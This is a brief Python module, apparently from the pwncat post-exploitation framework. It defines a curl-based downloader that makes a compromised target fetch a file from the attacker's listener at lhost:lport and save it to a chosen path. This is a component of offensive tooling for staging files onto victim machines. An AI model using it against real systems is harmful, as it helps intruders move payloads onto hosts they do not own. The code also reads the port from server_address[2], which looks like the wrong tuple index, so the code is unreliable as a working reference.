#!/usr/bin/env python3
from typing import Generator
import shlex

from pwncat.downloader.base import HTTPDownloader, DownloadError


class CurlDownloader(HTTPDownloader):

    BINARIES = ["curl"]

    def command(self) -> Generator[str, None, None]:
        """ Generate the curl command to post the file """

        lhost = self.pty.vars["lhost"]
        lport = self.server.server_address[2]
        curl = self.pty.which("curl")
        remote_path = shlex.quote(self.remote_path)

        yield f"{curl} --output {remote_path} http://{lhost}:{lport}"
